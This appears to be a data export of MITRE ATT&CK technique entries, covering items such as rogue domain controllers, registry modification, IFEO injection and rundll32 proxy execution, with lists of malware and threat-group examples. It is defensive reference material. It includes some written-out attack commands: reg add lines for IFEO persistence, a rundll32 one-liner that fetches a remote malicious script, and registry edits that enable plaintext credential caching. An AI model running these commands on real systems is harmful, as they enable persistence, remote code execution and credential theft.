T1596,Search Open Technical Databases,"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.  Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [External Remote Services] or [Trusted Relationship]",[],False
T1207,Rogue Domain Controller,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.  Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.   This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection] and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. ",['[Mimikatz] <code>LSADUMP::DCShadow</code> module can be used to make AD updates by temporarily setting a computer to be a DC.'],
T1610,Deploy Container,"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host] and access other containers running on the node.   Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.","['[Kinsing] was run through a deployed Ubuntu container.', '[TeamTNT] has deployed different types of containers into victim environments to facilitate execution. [TeamTNT] has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.', '[Peirates] can deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.', '[Doki] was run through a deployed container.']",False
T1107,File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.  There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd] functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. ","['[Shamoon] attempts to overwrite operating system files with image files.', 'Dragonfly deleted a file immediately after executing it on a victim host.', 'APT32 has cleared select event log entries.', 'APT34 has deleted initial drop files from the staging directory.']",True
T1145,Private Keys,"Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.   Adversaries may gather private keys from compromised systems for use in authenticating to [Remote Services] like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\Users\(username)\.ssh\</code> on Windows.  Private keys should require a password or passphrase for operation, so an adversary may also use [Input Capture] for keylogging or attempt to [Brute Force] the passphrase off-line.  Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.  ",[],True
T1112,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.  Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg] may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.  Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg] or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.    The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts] are required, along with access to the remote system's [SMB/Windows Admin Shares] for RPC communication.","['[CharmPower] can remove persistence-related artifacts from the Registry.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] modified in-registry Internet settings to lower internet security before launching `rundll32.exe`, which in-turn launches the malware and communicates with C2 servers over the Internet. .', '[Turla] has modify Registry values to store payloads.', '[PlugX] has a module to create, delete, or modify Registry keys.', '[ShadowPad] can modify the Registry to store and maintain a configuration block and virtual file system.', '[Netwalker] can add the following registry entry: <code>HKEY_CURRENT_USER\\SOFTWARE\\{8 random characters}</code>.', '[Valak] has the ability to modify the Registry key <code>HKCU\\Software\\ApplicationContainer\\Appsw64</code> to store information regarding the C2 server and downloads.', '[ROKRAT] can modify the `HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\` registry key so it can bypass the VB object model (VBOM) on a compromised host.', '[APT38] uses a tool called CLEANTOAD that has the capability to modify Registry keys.', '[HOPLIGHT] has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.\t', '[Catchamas] creates three Registry keys to establish persistence by adding a [Windows Service]', '[gh0st RAT] has altered the InstallTime subkey.', '[SynAck] can manipulate Registry keys.', '[SLOTHFULMEDIA] can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap</code> registry.', '[Conficker] adds keys to the Registry at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services</code> and various other Registry locations.', '[DCSrv] has created Registry keys for persistence.', '[SUNBURST] had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their <code>HKLM\\SYSTEM\\CurrentControlSet\\services\\\\[service_name]\\\\Start</code> registry entries to value 4. It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.', 'A [Patchwork] payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.', '[Explosive] has a function to write itself to Registry values. ', '[PolyglotDuke] can write encrypted JSON configuration files to the Registry.', '[PoisonIvy] creates a Registry subkey that registers a new system device.', '[KOCTOPUS] has added and deleted keys from the Registry.', '[LoJax] has modified the Registry key <code>‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’</code> from <code>‘autocheck autochk *’</code> to <code>‘autocheck autoche *’</code>.', '[PHOREAL] is capable of manipulating the Registry.', '[PoetRAT] has made registry modifications to alter its behavior upon execution.', '[REvil] can modify the Registry to save encryption parameters and system information.', '[BACKSPACE] is capable of deleting Registry keys, sub-keys, and values on a victim system.', '[DarkWatchman] can modify Registry values to store configuration strings, keylogger, and output of components.', '[Grandoreiro] can modify the Registry to store its configuration at `HKCU\\Software\\` under frequently changing names including <code>%USERNAME%</code> and <code>ToolTech-RM</code>.', '[Taidoor] has the ability to modify the Registry on compromised hosts using <code>RegDeleteValueA</code> and <code>RegCreateKeyExA</code>.', '[Stuxnet] can create registry keys to load driver files.', '[TinyTurla] can set its configuration parameters in the Registry.', '[FELIXROOT] deletes the Registry key <code>HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open</code>.', '[SMOKEDHAM] has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.', '[Pillowmint] has modified the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\DRM</code> to store a malicious payload.', '[PipeMon] has modified the Registry to store its encrypted payload.', '[Mafalda] can manipulate the system registry on a compromised host.', '[Ember Bear] has used an open source batch script to modify Windows Defender registry keys.', '[Silence] can create, delete, or modify a specified Registry key or value.', '[TA505] has used malware to disable Windows Defender through modification of the Registry.', '[CHOPSTICK] may modify Registry keys to store RC4 encrypted configuration information.', '[HermeticWiper] has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.', '[WarzoneRAT] can create `HKCU\\Software\\Classes\\Folder\\shell\\open\\command` as a new registry key during privilege escalation. ', '[Cobalt Strike] can modify Registry values within <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\</code> to enable the execution of additional code.', '[APT19] uses a Port 22 malware variant to modify several Registry keys.', '[CSPY Downloader] can write to the Registry under the <code>%windir%</code> variable to execute tasks.', '[Gelsemium] can modify the Registry to store its components.', '[WastedLocker] can modify registry values within the <code>Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap</code> registry key.', '[metaMain] can write the process ID of a target process into the `HKEY_LOCAL_MACHINE\\SOFTWARE\\DDE\\tpid` Registry value as part of its reflective loading activity.', '[QuasarRAT] has a command to edit the Registry on the victim’s machine.', '[Hydraq] creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. [Hydraq] backdoor also enables remote attackers to modify and delete subkeys.', '[BlackCat] has the ability to add the following registry key on compromised networks to maintain persistence: `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Paramenters`', '[Black Basta] can modify the Registry to enable itself to run in safe mode and to modify the icons and file extensions for encrypted files.', '[PLAINTEE] uses <code>reg add</code> to add a Registry Run key for persistence.', '[Gamaredon Group] has removed security settings for VBA macro execution by changing registry values <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\VBAWarnings</code> and <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\AccessVBOM</code>.', '[SILENTTRINITY] can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).', '[Uroburos] can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other [Uroburos] components.', '[Waterbear] has deleted certain values from the Registry to load a malicious DLL. ', '[SOUNDBITE] is capable of modifying the Registry.', 'During [Night Dragon] threat actors used [zwShell] to establish full remote control of the connected machine and manipulate the Registry.', '[Remcos] has full control of the Registry, including the ability to modify it.', '[InvisiMole] has a command to create, set, copy, or delete a specified Registry key or value.', '[Metamorfo] has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.', '[Mosquito] can modify Registry keys under <code>HKCU\\Software\\Microsoft\\[dllname]</code> to store configuration values. [Mosquito] also modifies Registry keys under <code>HKCR\\CLSID\\...\\InprocServer32</code> with a path to the launcher.', '[TEARDROP] modified the Registry to create a Windows service for itself on a compromised host.', '[StreamEx] has the ability to modify the Registry.', '[Attor] dispatcher can modify the Run registry key.', '[Lokibot] has modified the Registry as part of its UAC bypass process. ', '[ZxShell] can create Registry entries to enable services to run.', '[KONNI] has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence. ', '[Wizard Spider] has modified the Registry key <code>HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest</code> by setting the <code>UseLogonCredential</code> registry value to <code>1</code> in order to force credentials to be stored in clear text in memory. [Wizard Spider] has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.', ""[APT32] backdoor has modified the Windows Registry to store the backdoor's configuration. \t"", '[Pysa] has modified the registry key “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System” and added the ransom note. ', 'During [Operation Honeybee] the threat actors used batch files that modified registry keys.', '[BADCALL] modifies the firewall Registry key <code>SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\\\List</code>.', '[Earth Lusca] modified the registry using the command <code>reg add “HKEY_CURRENT_USER\\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]”</code> for persistence.', '[MegaCortex] has added entries to the Registry for ransom contact information.', '[Prestige] has the ability to register new registry keys for a new extension handler via `HKCR\\.enc` and `HKCR\\enc\\shell\\open\\command`.', '[RegDuke] can create seemingly legitimate Registry key to store its encryption key.', '[Blue Mockingbird] has used Windows Registry modifications to specify a DLL payload.\t', '[Neoichor] has the ability to configure browser settings by modifying Registry entries under `HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer`.', '[Tarrask] is able to delete the Security Descriptor (`SD`) registry subkey in order to “hide” scheduled tasks.', '[Caterpillar WebShell] has a command to modify a Registry key.', '[Bisonal] has deleted Registry keys to clean up its prior activity. ', '[TajMahal] can set the <code>KeepPrintedJobs</code> attribute for configured printers in <code>SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Print\\\\Printers</code> to enable document stealing.', '[HyperStack] can add the name of its communication pipe to <code>HKLM\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\lanmanserver\\\\parameters\\NullSessionPipes</code>.', '[Crimson] can set a Registry key to determine how long it has been installed and possibly to indicate the version number.', '[Orz] can perform Registry operations.', '[RTM] can delete all Registry entries created during its execution.', 'The [Samurai] loader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor.', 'During [Operation Wocao] the threat actors enabled Wdigest by changing the `HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest` registry value from 0 (disabled) to 1 (enabled).', '[Dragonfly] has modified the Registry to perform multiple techniques through the use of [Reg]', '[CrackMapExec] can create a registry key using wdigest.', '[Gorgon Group] malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under <code>HKCU\\Software\\Microsoft\\Office\\</code>.', '[zwShell] can modify the Registry.', '[Chaes] can modify Registry values to stored information and establish persistence. ', '[NanoCore] has the capability to edit the Registry.', '[Clop] can make modifications to Registry keys. ', '[ThreatNeedle] can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon`.', '[Ursnif] has used Registry modifications as part of its installation routine.', '[PowerShower] has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.', '[ADVSTORESHELL] is capable of setting and deleting Registry values.', '[EVILNUM] can make modifications to the Regsitry for persistence.', '[Zeus Panda] modifies several Registry keys under <code>HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\</code> to disable phishing filters.', '[Exaramel for Windows] adds the configuration to the Registry in XML format.', '[Naid] creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.', 'Once [Shamoon] has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> to 1.', '[SysUpdate] can write its configuration file to <code>Software\\Classes\\scConfig</code> in either <code>HKEY_LOCAL_MACHINE</code> or <code>HKEY_CURRENT_USER</code>.', '[LuminousMoth] has used malware that adds Registry keys for persistence.', '[njRAT] can create, delete, or modify a specified Registry key or value.', '[Mori] can write data to `HKLM\\Software\\NFC\\IPA` and `HKLM\\Software\\NFC\\` and delete Registry values.', '[GreyEnergy] modifies conditions in the Registry and adds keys.', '[Reg] may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.', '[Rover] has functionality to remove Registry Run key persistence as a cleanup procedure.', '[Volgmer] modifies the Registry to store an encoded configuration file in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security</code>.', '[Clambling] can set and delete Registry keys.', '[QakBot] can modify the Registry to store its configuration information in a randomly named subkey under <code>HKCU\\Software\\Microsoft</code>.', '[Bankshot] writes data into the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj</code>.', '[Kimsuky] has modified Registry settings for default file associations to enable all macros and for persistence.', '[ComRAT] has modified Registry values to store encrypted orchestrator code and payloads. ', '[Avaddon] modifies several registry keys for persistence and UAC bypass.', '[Amadey] has overwritten registry keys for persistence.', '[TrickBot] can modify registry entries.', '[APT41] used a malware variant called GOODLUCK to modify the registry in order to steal credentials.', '[DarkComet] adds a Registry value for its installation routine to the Registry Key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=”0”</code> and <code>HKEY_CURRENT_USER\\Software\\DC3_FEXEC</code>.', '[Magic Hound] has modified Registry settings for security tools.', '[TYPEFRAME] can install encrypted configuration data under the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll</code> and <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs</code>.', '[PcShare] can delete its persistence mechanisms from the registry.', '[KEYMARBLE] has a command to create Registry entries for storing data under <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath</code>.', '[Ferocious] has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.', '[DarkTortilla] has modified registry keys for persistence.', '[Cardinal RAT] sets <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> to point to its executable.', '[Agent Tesla] can achieve persistence by modifying Registry key entries. ', '[NightClub] can modify the Registry to set the ServiceDLL for a service created by the malware for persistence. ', '[QUADAGENT] modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.', '[NETWIRE] can modify the Registry to store its configuration information.', '[Sibot] has modified the Registry to install a second-stage script in the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot</code>.', '[BitPaymer] can set values in the Registry to help in execution. ', '[RCSession] can write its configuration file to the Registry.', '[Nerex] creates a Registry subkey that registers a new service.', '[ShimRat] has registered two registry keys for shim databases.', 'A [Threat Group-3390] tool has created new Registry keys under `HKEY_CURRENT_USER\\Software\\Classes\\` and `HKLM\\SYSTEM\\CurrentControlSet\\services`.', '[FIN8] has deleted Registry keys during post compromise cleanup activities.', '[AADInternals] can modify registry keys as part of setting a new pass-through authentication agent.', '[Regin] appears to have functionality to modify remote Registry information.', '[Pandora] can write an encrypted token to the Registry to enable processing of remote commands.', '[Honeybee] uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.', '[Operation Wocao] has enabled Wdigest by changing the registry value from 0 to 1.', '[Dragonfly 2.0] modified the Registry to perform multiple techniques through the use of [Reg]', '[Lazarus Group] has modified registry keys using the reg windows utility for its custom backdoor implants.', 'creates a Registry subkey that registers a new system device.']",False
T1580,Cloud Infrastructure Discovery,"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.  Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project , and Azure's CLI command <code>az vm list</code> lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning]  An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery] this technique focuses on the discovery of components of the provided services rather than the services themselves.","['[Scattered Spider] enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers.', '[Pacu] can enumerate AWS infrastructure, such as EC2 instances.']",False
T1491,Defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement] include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement] in order to cause user discomfort, or to pressure compliance with accompanying messages.  ",[],
T1535,Unused/Unsupported Cloud Regions,"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.  Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.  A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.  An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking] which can cost organizations substantial amounts of money over time depending on the processing power used.",[],False
T1155,AppleScript,"macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program. AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.   Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  . Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>.",[],True
T1563,Remote Service Session Hijacking,"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.  Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking] differs from use of [Remote Services] because it hijacks an existing session rather than creating a new session using [Valid Accounts]",[],False
T1217,Browser Information Discovery,"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.  Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files] associated with logins cached by a browser.  Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).","['[Calisto] collects information on bookmarks from Google Chrome.', '[Lizar] can retrieve browser history and database files. ', '[Machete] retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers. ', '[Mispadu] can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.', '[PowerLess] has a browser info stealer module that can read Chrome and Edge browser database files.', '[Dtrack] can retrieve browser history.', '[Fox Kitten] has used Google Chrome bookmarks to identify internal resources and assets.', '[APT38] has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.', '[DarkWatchman] can retrieve browser history.', '[Mafalda] can collect the contents of the `%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\LocalState` file. ', '[Empire] has the ability to gather browser data such as bookmarks and visited sites.', '[SUGARDUMP] has collected browser bookmark and history information.', '[Scattered Spider] retrieves browser histories via infostealer malware such as Raccoon Stealer.', '[MobileOrder] has a command to upload to its C2 server victim browser bookmarks.', '[Chimera] has used <code>type \\\\<hostname>\\c$\\Users\\<username>\\Favorites\\Links\\Bookmarks bar\\Imported From IE\\*citrix*</code> for bookmark discovery.']",False
T1183,Image File Execution Options Injection,"Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”).   IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached.   IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>.    An example where the evil.exe process is started when notepad.exe exits:   * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"" /v GlobalFlag /t REG_DWORD /d 512</code> * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v ReportingMode /t REG_DWORD /d 1</code> * <code>reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v MonitorProcess /d ""C:\temp\evil.exe""</code>  Similar to [Process Injection] these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous invocation.  Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications.  ",[],True
T1085,Rundll32,"The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.  Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.   Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks. ",[],True
T1031,Modify Existing Service,"Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg]  Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading] that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.  Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands.  ","['[PlugX] has a module to change service configurations as well as start, control, and delete services.', ""[Volgmer] installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry."", '[APT32] modified Windows Services to ensure PowerShell scripts were loaded on the system.', '[TYPEFRAME] can delete services from the victim’s machine.', '[PoisonIvy] creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.', 'creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.']",True
T1092,Communication Through Removable Media,"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media] Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.","['Part of [APT28] operation involved using [CHOPSTICK] modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.', '[APT28] uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.', '[USBStealer] drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.']",False
T1222,File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).  Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features] [Boot or Logon Initialization Scripts] [Unix Shell Configuration Modification] or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow]  Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",[],False
T1179,Hooking,"Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions.   Hooking involves redirecting calls to these functions and can be implemented via:  * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.   * **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.    * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.     Similar to [Process Injection] adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.  Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access.   Hooking is commonly utilized by [Rootkit] to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. ",[],True
